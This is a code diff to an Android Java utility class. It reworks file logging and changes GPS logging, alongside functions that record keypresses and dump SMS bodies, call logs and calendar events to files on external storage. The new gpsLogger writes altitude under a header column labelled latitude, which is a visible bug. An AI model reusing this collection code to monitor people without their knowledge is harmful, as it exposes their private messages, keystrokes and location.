@@ -9,6 +9,7 @@ import java.util.Date;
 import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.database.Cursor;
+import android.location.Location;
 import android.net.Uri;
 import android.os.Environment;
 import android.provider.CalendarContract;
@@ -16,8 +17,10 @@ import android.provider.CallLog;
 
 public class LogMethods {
 	static String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+	
+	
 
-	public static void appendLog(String text, String FILENAME)
+	public static void printToLog(String text, String FILENAME, boolean do_append)
 	{       
 		File logFile = new File(SDCARD + "/" + FILENAME);
 		if (!logFile.exists())
@@ -34,9 +37,8 @@ public class LogMethods {
 		}
 		try
 		{
-			//BufferedWriter for performance, true to set append to file flag
-			BufferedWriter buf = new BufferedWriter(new FileWriter(logFile, true)); 
-			buf.append(text);
+			BufferedWriter buf = new BufferedWriter(new FileWriter(logFile, do_append)); 
+			buf.write(text);
 			buf.newLine();
 			buf.flush();
 			buf.close();
@@ -51,7 +53,7 @@ public class LogMethods {
 	public static void keyLogger (String keypress, String FILENAME){
 		Date date=new Date() ;
 		long now = date.getTime();
-		appendLog(String.valueOf(now) + "," + keypress ,FILENAME);
+		printToLog(String.valueOf(now) + "," + keypress ,FILENAME, true);
 	}
 	public static void dumpSms(ContentResolver cr, String FILENAME){
 
@@ -97,7 +99,7 @@ public class LogMethods {
 				toPrint += "\""+name+"\"," + "\""+number+"\"," + type + "," + date + "," + "\""+msgBody+"\"" + "\n";
 
 			}
-			appendLog(toPrint ,FILENAME);
+			printToLog(toPrint ,FILENAME,false);
 			messagesCursor.close();
 
 		}
@@ -147,7 +149,7 @@ public class LogMethods {
 				toPrint += "\""+name+"\"," + "\""+number+"\"," + String.valueOf(callType) + "," + String.valueOf(dateTimeMillis) + "," + String.valueOf(durationMillis) +  "\n";
 
 			}
-			appendLog(toPrint ,FILENAME);
+			printToLog(toPrint ,FILENAME,false);
 			mCallCursor.close();
 		}
 	}
@@ -184,16 +186,22 @@ public class LogMethods {
 				toPrint += begin + "," + end + "," + event_id  + "\n";
 
 			}
-			appendLog(toPrint ,FILENAME);
+			printToLog(toPrint ,FILENAME, false);
 			mCalendarCursor.close();
 		}
 	}
 
+	/*Fields go in conjunction with prepareGpsFile*/
+	public static void gpsLogger (Location location, String FILENAME){
 
-	public static void gpsLogger (double lat, double lon , String FILENAME){
+		printToLog(location.getTime() + "," + location.getAltitude() + "," + location.getLongitude() + "," + location.getAccuracy() ,FILENAME,true);
+	}
+	
+	/*Fields go in conjunction with gpsLogger*/
+	public static void prepareGpsFile (String FILENAME){
 
-		Date date=new Date() ;
-		long now = date.getTime();
-		appendLog(String.valueOf(now) + "," + lat + "," + lon ,FILENAME);
+		File gpsfile = new File(SDCARD + "/" + FILENAME);
+		if (!gpsfile.exists())
+			printToLog("\"TIME\",\"latitude\",\"longitude\",\"accuracy\"",  FILENAME, false);
 	}
 }
